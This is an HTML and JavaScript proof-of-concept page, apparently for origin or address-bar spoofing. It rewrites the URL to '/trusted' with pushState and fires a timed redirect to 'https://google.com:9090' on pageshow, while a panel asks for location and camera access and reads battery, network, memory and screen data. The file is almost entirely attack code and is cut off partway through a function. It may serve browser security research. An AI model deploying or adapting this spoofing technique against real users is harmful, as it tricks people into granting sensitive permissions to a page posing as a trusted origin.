<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

video { width:100%; margin-top:10px; }

pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:11px;
  max-height:260px;
  overflow:auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Permissions and Device Info</h2>
  <div class="sub">Click below to interact with various browser APIs</div>

  <button onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <!-- Added more APIs for demonstration -->
  <button onclick="checkBatteryStatus()">Check Battery Status</button>
  <p id="batteryStatus">Battery: -</p>

  <button onclick="checkNetworkInfo()">Check Network Info</button>
  <p id="networkInfo">Network: -</p>

  <button onclick="checkDeviceMemory()">Device Memory</button>
  <p id="deviceMemory">Memory: -</p>

  <button onclick="checkScreenResolution()">Screen Resolution</button>
  <p id="screenResolution">Resolution: -</p>

  <hr>

  <button onclick="callAllAPIs()">CALL ALL APIs</button>
  <button onclick="clearLog()">CLEAR LOG</button>
  <pre id="apiLog"></pre>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const apiLog = document.getElementById('apiLog');

/* ====================== 
   FUNGSI ASLI (TIDAK DIUBAH)
====================== */
function getLocation() {
  const output = document.getElementById('locationOutput');
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => output.textContent =
      `${pos.coords.latitude}, ${pos.coords.longitude}`,
    () => output.textContent = 'Permission denied'
  );
}

function openCamera() {
  navigator.mediaDevices.getUserMedia({ video:true })
    .then(s => camera.srcObject = s)
    .catch(()=>alert('Camera denied'));
}

/* ====================== 
   API EXTENSIONS (ADDITIONAL)
====================== */

async function checkBatteryStatus() {
  const output = document.getElementById('batteryStatus');
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    output.textContent = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
  } else {
    output.textContent = 'Battery API not supported';
  }
}

async function checkNetworkInfo() {
  const output = document.getElementById('networkInfo');
  if (navigator.connection) {
    output.textContent = `Effective type: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mb/s`;
  } else {
    output.textContent = 'Network Information API not supported';
  }
}

async function checkDeviceMemory() {
  const output = document.getElementById('deviceMemory');
  if ('deviceMemory' in navigator) {
    output.textContent = `${navigator.deviceMemory} GB`;
  } else {
    output.textContent = 'Device Memory API not supported';
  }
}

function checkScreenResolution() {
  const output = document.getElementById('screenResolution');
  output.textContent = `${screen.width}x${screen.height}`;
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

/* ====================== 
   CALL ALL APIS
====================== */
const log = m => apiLog.textContent += m + "\n";
const clearLog = () => apiLog.textContent = "";

async function callAllAPIs() {
  log("=== API DETAILS ===");

  // Battery
  await checkBatteryStatus();

  // Network Info
  await checkNetworkInfo();

  // Device Memory
  await checkDeviceMemory();
